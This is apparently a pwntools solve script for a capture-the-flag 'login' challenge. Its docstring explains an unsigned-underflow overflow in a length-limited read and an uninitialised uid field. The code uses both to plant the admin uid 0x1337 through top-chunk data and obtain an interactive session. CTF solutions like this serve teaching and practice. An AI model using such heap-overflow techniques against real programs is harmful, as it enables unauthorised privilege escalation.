from pwn import *

"""
There are a few bugs, some exploitable and some not.

1. The user_t struct is declared with typedef but as a pointer,
so actually sizeof(user_t) returns 8. This means the allocated
chunk will have size 0x20 (including metadata) which is smaller
than what the struct can actually hold. This means we could use
the username field to overflow the next chunk, but it turns out
that we can only overflow into a bit of the metadata of the next
chunk and it isn't enough to overflow the uid field of the adjacent
user_t object.

2. The add_user function allocates a chunk for a new user object
and sets users[curr_user_id] to the newly allocated chunk. At the
end of the function, curr_user_id is incremented. The size of users
is fixed, so this actually gives an overflow as the capacity of
the users array is not checked. However it seems like there isn't
anything interesting after the users array.

3. After being allocated, the uid field in the user struct is not
initialised if the value is non-zero. If we can place the admin
uid where the next allocated user struct will have its uid field,
it won't be overwritten.

4. The read_n_delimited function reads up to n-1 bytes, stopping
at the given delimiter and placing a null byte immediately after
the last read byte in the buffer. There is a bug in this function
that allows arbitrary length write into the buffer if the length
parameter can be controlled; the while condition i <= n - 1 involves
only unsigned ints (size_t is unsigned), so if n is 0, then the
condition will always hold. When reading the username length, we
cannot provide negative or large values, but we can provide 0, so
this gives us an overflow in the username field for any user object.

We still need to be able to set a user's uid to 0x1337 and we can't use
the overflow directly because once a user is added, we can't modify
it or previous users. Fortunately, we can just write in the data of
the top chunk and when the next user struct gets allocated, it will
have that data.
"""

def add_user(username_len, username):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Username length: ', str(username_len).encode())
    conn.sendlineafter(b'Username: ', username)

def login(username):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'Username: ', username)

# conn = process('../publish/login')
conn = remote('0.0.0.0', 1337)

add_user(0, b'X' * 20 + p64(0x2000) + p32(0x1337) + b'x')
add_user(2, b'x')
login(b'x')

conn.interactive()
